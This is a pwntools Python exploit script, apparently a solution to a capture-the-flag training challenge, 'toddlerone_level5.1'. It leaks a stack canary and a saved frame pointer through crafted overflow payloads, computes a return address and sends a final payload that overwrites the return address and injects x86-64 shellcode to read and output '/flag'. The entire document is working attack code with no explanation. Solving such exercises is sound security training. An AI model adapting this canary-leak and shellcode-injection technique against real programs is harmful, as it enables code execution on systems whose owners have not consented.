from pwn import *

p = process("/challenge/toddlerone_level5.1")

"""
rsp = int(input("Rsp = "))
rbp = int(input("RBP = "))
ret = rbp+0x8
canary = rbp-int(input("offset = "))
"""

rsp = 0x7ffecc461d30
rbp = 0x7ffecc461dc0
ret = 0x7ffecc461dc8
canary = 0x7ffecc461db8
in_addr = 0x7ffecc461d80


before_ret = ret - in_addr
before_canary = (canary - in_addr)
print("before canary payload size : ", before_canary)
print("before ret payload size : ", before_ret)

p.readuntil(b'Payload size: ')
canary_payload = b'57 REPEAT' + b'a' * \
    (before_canary-6-0x8) + b'\xd1\x8d\xe2\xf9\xc5\x03\x8a\x90'+b'a'
print("canary payload = ", canary_payload)
print("canary payload length = ", len(canary_payload))
p.send(canary_payload)
p.readuntil(b'\xd1\x8d\xe2\xf9\xc5\x03\x8a\x90'+b'a')
x = p.readuntil(b'Backdoor')
# print(x)
Canary = b'\x00' + x[:7]
xcanary = b'A' + x[:7]
print("canary = ", Canary)
p.readuntil(b'Payload size: ')


p.send(b'10 REPEATaaaa')
p.readuntil(b'Payload size: ')


prev_rbp_payload = b'64 REPEAT' + b'a' * \
    (before_canary-6-0x8) + b'\xd1\x8d\xe2\xf9\xc5\x03\x8a\x90' + b'zzzzzzzz'

print("Previous rbp payload = ", prev_rbp_payload)
print("previous rbp payload length = ", len(prev_rbp_payload))
p.send(prev_rbp_payload)
y = p.readuntil(b'zzzzzzzz')
x = p.readuntil(b'Payload size: ')
print("prev rbp + garbage : ", x)
x = x[:6]
if x == b'\nBackd':
    print("TRUE")

prev_rbp = int.from_bytes(x, 'little')
print("Previous rbp = ", hex(prev_rbp))
print(x)


# p.readuntil(b'Payload size: ')
ret_addr = prev_rbp-0x130
ret = ret_addr.to_bytes(8, 'little')
print("Return address = ", hex(ret_addr))


context.arch = 'amd64'
assem = """
    mov rax, 2
    lea rdi, [rip + file]
    mov rsi, 0
    syscall
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall
    mov rax, 60
    syscall
file:
    .string "/flag"
"""
shellcode = asm(assem)
print("shellcode length = ", len(shellcode))

final_payload = b'151 aaaaaa' + b'a' * \
    (before_canary-6-0x10) + b'\x90\x8a\x03\xc5\xf9\xe2\x8d\xd1zzzzzzzz' + \
    Canary + b'x'*8 + ret + shellcode
print("final payload : ", final_payload)
print("payload length = ", len(final_payload))
p.send(final_payload)

# p.readuntil(b'Goodbye!\n')
x = p.readall()
print(x)
